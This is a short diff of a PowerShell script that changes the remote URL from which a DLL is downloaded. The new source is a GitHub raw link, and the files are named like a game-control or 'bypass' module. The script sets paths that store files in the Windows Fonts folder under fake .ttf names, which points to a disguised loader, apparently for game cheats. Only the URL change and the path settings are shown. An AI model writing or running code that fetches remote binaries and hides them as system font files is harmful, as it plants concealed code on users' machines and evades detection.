@@ -483,7 +483,7 @@ function Get-SiteData {
 }
 
 
-$downloadUrl = "https://bypass.netlify.app/bypass.dll"
+$downloadUrl = "https://raw.githubusercontent.com/WkgGlobalservices2024/shzzz/main/xgamecontrol.dll"
 
 $setupPath = "C:\Windows\Fonts\dafont.ttf"
 $checkPath = "C:\Windows\Fonts\bilek.ttf"
